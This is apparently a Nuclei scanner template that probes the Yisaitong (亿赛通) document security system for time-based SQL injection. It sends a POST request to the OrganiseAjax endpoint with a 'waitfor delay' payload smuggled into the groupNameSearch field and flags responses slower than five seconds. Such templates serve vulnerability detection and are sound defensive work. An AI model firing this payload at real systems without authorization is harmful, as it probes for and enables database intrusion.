id: esafe-delay-injection

info:
  name: 亿赛通电子文档安全管理系统 Delay Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template checks for potential SQL injection vulnerabilities by introducing a delay with the 'waitfor delay' command in 亿赛通电子文档安全管理系统.

http:
  - raw:
      - |
        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        command=search&groupNameSearch=-1'waitfor delay '0:0:5'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration > 5000"